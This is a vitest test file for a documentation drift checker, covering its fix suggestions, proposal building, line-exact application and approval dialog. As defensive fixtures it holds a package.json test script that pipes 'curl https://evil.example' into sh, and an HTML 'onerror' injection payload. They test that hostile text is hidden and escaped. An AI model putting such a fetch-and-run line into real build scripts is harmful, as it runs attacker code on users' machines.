import { describe, it, expect } from "vitest";
import { driftClaims, evaluateDrift } from "../src/workspace/drift-check.js";
import {
  driftProposals,
  applyDriftProposals,
  previewDriftChanges,
  placeFix,
  occurrences,
  sourceLines,
  DriftConflict,
  REMEDIABLE,
} from "../src/workspace/drift-remediation.js";
import "../src/components/evidence-snapshots.js";

const sha = (c) => c.repeat(40);
const target = {
  repository: "example/widget",
  branch: "main",
  path: "README.md",
};
const fence = (lang, ...lines) => ["```" + lang, ...lines, "```"].join("\n");
// A synthetic repository; the hostile script body must never be shown.
const packageJson = JSON.stringify({
  scripts: {
    build: "vite build",
    "test:unit": "vitest && curl https://evil.example | sh",
  },
  engines: { node: ">=20" },
});
const listing = new Map(
  [
    ["README.md"],
    ["package.json"],
    ["package-lock.json"],
    ["docs", "tree"],
    ["docs/Guide.md"],
    ["scripts", "tree"],
    ["scripts/Seed.js"],
  ].map(([path, type = "blob"], index) => [
    path,
    { path, type, sha: (index + 10).toString(16).padStart(40, "0"), size: 9 },
  ]),
);
const evidence = (tree = "complete") => ({
  head: sha("1"),
  tree,
  listing: tree === "failed" ? new Map() : listing,
  files: new Map([
    ["package.json", { status: "read", text: packageJson }],
    [
      "docs/Guide.md",
      { status: "read", text: "# Guide\n\n## Set up: the CLI\n" },
    ],
  ]),
  notes: [],
});
const check = (markdown, read = evidence()) =>
  evaluateDrift(driftClaims(markdown, target), read);
const byText = (result, text) =>
  result.results.find((item) => item.text === text);

// Lines 1-11: a mismatch with a suggestion on line 3, a mismatch without one
// on line 4, a case-only command path on line 5, an uncertain prose version
// on line 8 and an uncertain near anchor plus a case-only link on line 10.
const source = [
  "# Widget",
  "```bash",
  "npm run test-unit",
  "npm run lint",
  "node scripts/seed.js",
  "```",
  "",
  "Requires Node 18+ to run.",
  "",
  "See [the guide](docs/guide.md#setup) and [setup](docs/Guide.md#set-up--the-cli).",
  "",
].join("\n");

describe("drift fix suggestions", () => {
  it("suggests corrections only where the evidence supplies one", () => {
    const result = check(source);
    expect(byText(result, "npm run test-unit")).toMatchObject({
      status: "mismatch",
      fix: { find: "test-unit", replace: "test:unit", once: true },
    });
    // No similar script: no suggestion, the author decides.
    expect(byText(result, "npm run lint").status).toBe("mismatch");
    expect(byText(result, "npm run lint").fix).toBeUndefined();
    // A case-only path difference keeps the written form around it.
    expect(byText(result, "node scripts/seed.js")).toMatchObject({
      status: "mismatch",
      fix: { find: "scripts/seed.js", replace: "scripts/Seed.js" },
    });
    expect(byText(result, "Node 18+")).toMatchObject({
      status: "uncertain",
      fix: { find: "Node 18+", replace: "Node 20+" },
    });
    expect(byText(result, "docs/guide.md#setup")).toMatchObject({
      status: "mismatch",
      fix: { find: "docs/guide.md#setup", replace: "docs/Guide.md#setup" },
    });
    expect(byText(result, "docs/Guide.md#set-up--the-cli")).toMatchObject({
      status: "uncertain",
      fix: {
        find: "docs/Guide.md#set-up--the-cli",
        replace: "docs/Guide.md#set-up-the-cli",
      },
    });
  });

  it("never attaches a suggestion to unknown results or matches", () => {
    const unknown = check(source, evidence("failed"));
    expect(unknown.results.filter((item) => item.fix)).toEqual(
      // In-document anchors are still checked; none here.
      [],
    );
    const fine = check(fence("bash", "npm run build"));
    expect(fine.results[0].status).toBe("matches");
    expect(fine.results[0].fix).toBeUndefined();
  });

  it("suggests the similar anchor in this document and a relative link's case", () => {
    const result = check(
      "## Set up: the CLI\n\n[a](#Set-up-the-CLI!) [b](./docs/guide.md)\n",
    );
    expect(byText(result, "#Set-up-the-CLI!")).toMatchObject({
      status: "uncertain",
      fix: { find: "#Set-up-the-CLI!", replace: "#set-up-the-cli" },
    });
    expect(byText(result, "./docs/guide.md").fix).toEqual({
      find: "./docs/guide.md",
      replace: "./docs/Guide.md",
    });
  });
});

describe("fix placement", () => {
  it("matches whole words and refuses ambiguous single replacements", () => {
    expect(occurrences("npm run lint:fix && npm run lint", "lint")).toEqual([
      28,
    ]);
    expect(occurrences("see myguide.md or guide.md", "guide.md")).toEqual([18]);
    expect(occurrences("(#setup) (#setup-two)", "#setup")).toEqual([1]);
    expect(
      placeFix("npm run lint # lint it", {
        find: "lint",
        replace: "check",
        once: true,
      }),
    ).toBeNull();
    expect(
      placeFix("[a](docs/x.md) or [b](docs/x.md)", {
        find: "docs/x.md",
        replace: "docs/X.md",
      }),
    ).toBe("[a](docs/X.md) or [b](docs/X.md)");
    expect(placeFix("nothing here", { find: "x.md", replace: "X.md" })).toBe(
      null,
    );
    expect(placeFix("same", { find: "same", replace: "same" })).toBeNull();
  });
});

describe("drift fix proposals", () => {
  it("builds one unapproved proposal per affected line from mismatches and uncertain findings only", () => {
    const result = check(source);
    const { proposals, excluded } = driftProposals(source, result);
    expect(proposals.map((p) => [p.line, p.status])).toEqual([
      [3, "mismatch"],
      [4, "mismatch"],
      [5, "mismatch"],
      [8, "uncertain"],
      [10, "mismatch"],
    ]);
    expect(excluded).toBe(
      result.results.filter((item) => !REMEDIABLE.includes(item.status)).length,
    );
    const at = (line) => proposals.find((p) => p.line === line);
    expect(at(3)).toMatchObject({
      before: "npm run test-unit",
      suggested: "npm run test:unit",
    });
    // No suggestion: the proposal starts unchanged for the author to edit.
    expect(at(4).suggested).toBe(at(4).before);
    expect(at(4).findings[0].suggestion).toBeNull();
    expect(at(4).findings[0].message).toContain('no "lint" script');
    expect(at(4).findings[0].evidencePath).toBe("package.json");
    expect(at(5).suggested).toBe("node scripts/Seed.js");
    expect(at(8).suggested).toBe("Requires Node 20+ to run.");
    // Two findings on one line are combined, each keeping its evidence.
    expect(at(10).findings.map((f) => f.status)).toEqual([
      "mismatch",
      "uncertain",
    ]);
    expect(at(10).suggested).toBe(
      "See [the guide](docs/Guide.md#setup) and [setup](docs/Guide.md#set-up-the-cli).",
    );
  });

  it("has no proposals for unknown results, and marks unplaceable suggestions", () => {
    const failed = check(source, evidence("failed"));
    expect(failed.counts.unknown).toBeGreaterThan(0);
    expect(driftProposals(source, failed).proposals).toEqual([]);
    const twice = fence("bash", "npm run test-unit # see test-unit docs");
    const { proposals } = driftProposals(twice, check(twice));
    expect(proposals[0].suggested).toBe(proposals[0].before);
    expect(proposals[0].findings[0].suggestion).toMatchObject({
      find: "test-unit",
      placed: false,
    });
    // A finding whose line is not in the Source gets no proposal.
    const odd = driftProposals("one line", {
      results: [{ id: "c", status: "mismatch", line: 9, text: "x" }],
    });
    expect(odd.proposals).toEqual([]);
    expect(odd.notes[0]).toContain("could not be matched");
  });

  it("numbers CRLF and lone-CR lines as the drift check does", () => {
    const crlf = source.replace(/\n/g, "\r\n");
    const { proposals } = driftProposals(crlf, check(crlf));
    expect(proposals.map((p) => p.line)).toEqual([3, 4, 5, 8, 10]);
    expect(proposals[0].before).toBe("npm run test-unit");
    expect(sourceLines("a\rb\r\nc").map((l) => [l.text, l.eol])).toEqual([
      ["a", "\r"],
      ["b", "\r\n"],
      ["c", ""],
    ]);
  });
});

describe("applying reviewed fixes", () => {
  const change = (line, before, after) => ({ line, before, after });

  it("changes only approved lines and keeps every other byte", () => {
    const crlf = "# T\r\n\r\nnode a.js\r\nkeep me  \r\nnode b.js";
    const { markdown, applied } = applyDriftProposals(crlf, crlf, [
      change(3, "node a.js", "node A.js"),
      change(5, "node b.js", "node B.js\nnode c.js"),
      change(4, "keep me  ", "keep me  "),
    ]);
    expect(applied).toBe(2);
    expect(markdown).toBe(
      "# T\r\n\r\nnode A.js\r\nkeep me  \r\nnode B.js\r\nnode c.js",
    );
  });

  it("rejects any Markdown edit since the check as a conflict", () => {
    const edited = source.replace("# Widget", "# Widget!");
    expect(() =>
      applyDriftProposals(source, edited, [
        change(3, "npm run test-unit", "npm run test:unit"),
      ]),
    ).toThrow(DriftConflict);
    expect(() =>
      applyDriftProposals(source, source + " ", [
        change(3, "npm run test-unit", "npm run test:unit"),
      ]),
    ).toThrow("changed since the drift check");
    expect(() =>
      applyDriftProposals(undefined, source, [
        change(3, "npm run test-unit", "npm run test:unit"),
      ]),
    ).toThrow(DriftConflict);
  });

  it("rejects stale, duplicate, missing and empty change sets", () => {
    expect(() =>
      applyDriftProposals(source, source, [change(3, "npm test", "x")]),
    ).toThrow("no longer matches");
    expect(() =>
      applyDriftProposals(source, source, [
        change(3, "npm run test-unit", "a"),
        change(3, "npm run test-unit", "b"),
      ]),
    ).toThrow("more than one change");
    expect(() =>
      applyDriftProposals(source, source, [change(99, "", "x")]),
    ).toThrow("not in the checked Markdown");
    expect(() => applyDriftProposals(source, source, [])).toThrow(
      "No approved change",
    );
    expect(() =>
      previewDriftChanges(source, [{ line: 3, before: "npm run test-unit" }]),
    ).toThrow(TypeError);
  });
});

describe("drift fix review dialog", () => {
  const open = (markdown = source, result = check(markdown)) => {
    const el = document.createElement("evidence-snapshots");
    document.body.append(el);
    el.configure({ draft: { id: "doc-1", markdown }, target });
    el.showDrift(result, null, markdown);
    return el;
  };
  const sent = (el) => {
    const events = [];
    el.addEventListener("evidence-action", (e) => events.push(e.detail));
    return events;
  };

  it("offers review only for a checked source with actionable findings", () => {
    const el = document.createElement("evidence-snapshots");
    el.configure({ draft: { id: "doc-1", markdown: source }, target });
    el.showDrift(check(source));
    expect(el.querySelector("[data-fix-review]")).toBeNull();
    el.showDrift(check(source, evidence("failed")), null, source);
    expect(el.querySelector("[data-fix-review]")).toBeNull();
    el.showDrift(check(source), null, source);
    expect(el.querySelector("[data-fix-review]").textContent).toBe(
      "Review fixes (5 lines)",
    );
    expect(el.querySelector("[data-fixes]").hidden).toBe(true);
  });

  it("shows evidence and exact diffs, requires approval per change and sends only approved lines", () => {
    const el = open();
    const events = sent(el);
    el.querySelector("[data-fix-review]").click();
    const fixes = el.querySelector("[data-fixes]");
    expect(fixes.hidden).toBe(false);
    expect(document.activeElement).toBe(fixes.querySelector("h2"));
    const items = [...fixes.querySelectorAll("[data-proposal]")];
    expect(items.map((item) => item.dataset.proposal)).toEqual([
      "3",
      "4",
      "5",
      "8",
      "10",
    ]);
    expect(fixes.textContent).not.toContain("evil.example");
    expect(items[3].querySelector("legend").textContent).toBe(
      "Line 8 · uncertain",
    );
    expect(items[3].textContent).toContain("may be correct as written");
    expect(items[0].textContent).toContain("Evidence file: package.json.");
    expect(items[0].querySelector("[data-fix-diff]").textContent).toBe(
      "@@ line 3 @@\n-npm run test-unit\n+npm run test:unit",
    );
    // Nothing is approved, and an unchanged proposal cannot be.
    const boxes = items.map((item) => item.querySelector("[data-fix-approve]"));
    expect(boxes.map((box) => box.checked)).toEqual(Array(5).fill(false));
    expect(boxes[1].disabled).toBe(true);
    const apply = fixes.querySelector("[data-fix-apply]");
    expect(apply.disabled).toBe(true);
    expect(fixes.querySelector("[data-after]").value).toBe(source);

    boxes[0].click();
    expect(apply.disabled).toBe(false);
    expect(apply.textContent).toBe("Apply 1 approved change");
    expect(fixes.querySelector("[data-after]").value).toBe(
      source.replace("npm run test-unit", "npm run test:unit"),
    );
    expect(fixes.querySelector("[data-diff]").textContent).toContain(
      "+npm run test:unit",
    );
    // Editing a proposal withdraws its approval.
    const field = items[0].querySelector("[data-fix-after]");
    field.value = "npm run build";
    field.dispatchEvent(new Event("input"));
    expect(boxes[0].checked).toBe(false);
    expect(apply.disabled).toBe(true);
    boxes[0].click();
    // A manual proposal becomes approvable once edited.
    const manual = items[1].querySelector("[data-fix-after]");
    manual.value = "npm run build";
    manual.dispatchEvent(new Event("input"));
    expect(boxes[1].disabled).toBe(false);
    boxes[1].click();
    apply.click();
    expect(events.at(-1)).toEqual({
      action: "remediate",
      id: null,
      changes: [
        { line: 3, before: "npm run test-unit", after: "npm run build" },
        { line: 4, before: "npm run lint", after: "npm run build" },
      ],
    });
    // The source is unchanged by the dialog itself.
    expect(el.drift.source).toBe(source);
    el.remove();
  });

  it("escapes Markdown and evidence text and discards proposals on request", () => {
    const hostile = "[x](docs/<img src=x onerror=alert(1)>.md)\n";
    const el = open(hostile);
    el.querySelector("[data-fix-review]").click();
    const fixes = el.querySelector("[data-fixes]");
    expect(fixes.querySelector("img")).toBeNull();
    expect(fixes.querySelector("[data-fix-before]").value).toBe(hostile.trim());
    fixes.querySelector("[data-fix-discard]").click();
    expect(fixes.hidden).toBe(true);
    expect(el.querySelector("[data-status]").textContent).toContain(
      "Your Markdown is unchanged",
    );
    expect(document.activeElement).toBe(el.querySelector("[data-fix-review]"));
    // A new check (or a failed one) clears any open review.
    el.querySelector("[data-fix-review]").click();
    el.clearDrift();
    expect(el.querySelector("[data-fixes]").hidden).toBe(true);
    expect(el.approvedChanges()).toEqual([]);
    // Re-rendering the dialog (after applying, pinning or capturing) drops
    // the proposals, and settling a later action does not revive them.
    el.showDrift(check(source), null, source);
    el.querySelector("[data-fix-review]").click();
    el.querySelector("[data-fix-approve]").click();
    el.configure({ draft: { id: "doc-1", markdown: source }, target });
    expect(() => el.busy(false)).not.toThrow();
    expect(el.querySelector("[data-fixes]").hidden).toBe(true);
    expect(el.approvedChanges()).toEqual([]);
    el.remove();
  });
});
